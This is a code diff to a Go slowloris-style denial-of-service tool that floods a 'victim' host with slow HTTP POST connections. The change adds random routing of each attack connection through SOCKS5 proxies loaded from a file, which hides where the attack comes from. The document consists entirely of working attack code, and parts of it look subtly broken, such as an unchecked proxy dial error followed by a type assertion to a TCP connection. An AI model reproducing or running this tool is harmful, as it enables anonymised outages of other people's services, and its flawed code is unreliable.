@@ -1,14 +1,17 @@
 package main
 
 import (
+	"bufio"
 	"crypto/tls"
 	"flag"
 	"fmt"
+	"golang.org/x/net/proxy"
 	"io"
 	"log"
 	"math/rand"
 	"net"
 	"net/url"
+	"os"
 	"runtime"
 	"time"
 )
@@ -21,8 +24,7 @@ var (
 	destinationHost   = flag.String("destinationHost", "www.google.com", "Victim's url. Http POST must be allowed in nginx config for this url")
 	destinationPort   = flag.String("destinationPort", "80", "Victim's port.")
 	hostHeader        = flag.String("hostHeader", *destinationHost, "Host header value in case it is different than the hostname in victimUrl")
-	proxyHost         = flag.String("proxyHost", "127.0.0.1", "SOCKS5 proxy host")
-	proxyPort         = flag.String("proxyPort", "80", "SOCKS5 proxy port")
+	proxyList         = flag.String("proxyList", "", "SOCKS5 proxy port")
 )
 
 var (
@@ -41,7 +43,7 @@ var (
 		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
 		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
 		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
-		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
 		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
 		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
 		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
@@ -61,6 +63,7 @@ var (
 )
 
 func main() {
+
 	runtime.GOMAXPROCS(runtime.NumCPU())
 	rand.Seed(time.Now().UTC().UnixNano())
 
@@ -75,8 +78,13 @@ func main() {
 		log.Fatalf("Cannot parse destinationUrl=[%s]: [%s]\n", destinationHostPort, err)
 	}
 
+	proxyList := generateProxyList(*proxyList)
 	for {
-		go dialWorker(destinationHostPort, generateRequestHeader(destinationUri.RequestURI()))
+		proxyHostPort := ""
+		if len(proxyList) != 0 {
+			proxyHostPort = proxyList[rand.Intn(len(proxyList))]
+		}
+		go dialWorker(destinationHostPort, proxyHostPort, generateRequestHeader(destinationUri.RequestURI()))
 	}
 }
 
@@ -88,28 +96,57 @@ func generateRequestHeader(uri string) []byte  {
 	return []byte(fmt.Sprintf("POST %s HTTP/1.1\nHost: %s%s\nContent-Type: application/x-www-form-urlencoded\nContent-Length: %d\n\n", uri, *hostHeader, userAgent,*contentLength))
 }
 
-func dialWorker(destinationHostPort string, requestHeader []byte) {
+func dialWorker(destinationHostPort, proxyHostPort string, requestHeader []byte) {
 	for {
-		conn := dialDestination(destinationHostPort)
+		conn := dialDestination(destinationHostPort, proxyHostPort)
 		if conn != nil {
 			go doLoris(conn, requestHeader)
 		}
 	}
 }
 
-func dialDestination(hostPort string) io.ReadWriteCloser {
-	// TODO hint: add support for dialing the victim via a random proxy from the given pool.
-	//dialer, err := proxy.SOCKS5("tcp", hostPort, nil, nil)
-	//if err != nil {
-	//	log.Printf("Couldn't setup proxy to [%s]: [%s]\n", hostPort, err)
-	//	return nil
-	//}
-
-	conn, err := net.Dial("tcp", hostPort)
-	if err != nil {
-		log.Printf("Couldn't esablish connection to [%s]: [%s]\n", hostPort, err)
-		return nil
+func generateProxyList(path string) (lines []string) {
+	if len(path) == 0 {
+		return
 	}
+
+	file, err := os.Open(path)
+	if err != nil {
+		log.Fatalf("Cannot open [%s]: [%s]\n", path, err)
+	}
+	defer file.Close()
+
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		proxyHostPort := scanner.Text()
+		proxyUri, err := url.Parse(proxyHostPort)
+		if err != nil {
+			log.Fatalf("Cannot parse destinationUrl=[%s]: [%s]\n", proxyHostPort, err)
+		}
+		lines = append(lines, proxyUri.RequestURI())
+	}
+	return
+
+}
+
+func dialDestination(destinationHostPort, proxyHostPort string) io.ReadWriteCloser {
+	var conn net.Conn
+	var err error
+	if len(proxyHostPort) == 0 {
+		conn, err = net.Dial("tcp", destinationHostPort)
+		if err != nil {
+			log.Printf("Couldn't esablish connection to [%s]: [%s]\n", destinationHostPort, err)
+			return nil
+		}
+	} else {
+		dialer, err := proxy.SOCKS5("tcp", proxyHostPort, nil, proxy.Direct)
+		if err != nil {
+			log.Printf("Couldn't setup proxy to [%s]: [%s]\n", proxyHostPort, err)
+			return nil
+		}
+		conn, err = dialer.Dial("tcp", destinationHostPort)
+	}
+
 	tcpConn := conn.(*net.TCPConn)
 	if err = tcpConn.SetReadBuffer(128); err != nil {
 		log.Fatalf("Cannot shrink TCP read buffer: [%s]\n", err)
@@ -127,7 +164,7 @@ func dialDestination(hostPort string) io.ReadWriteCloser {
 	tlsConn := tls.Client(conn, tlsConfig)
 	if err = tlsConn.Handshake(); err != nil {
 		conn.Close()
-		log.Printf("Couldn't establish tls connection to [%s]: [%s]\n", hostPort, err)
+		log.Printf("Couldn't establish tls connection to [%s]: [%s]\n", destinationHostPort, err)
 		return nil
 	}
 	return tlsConn
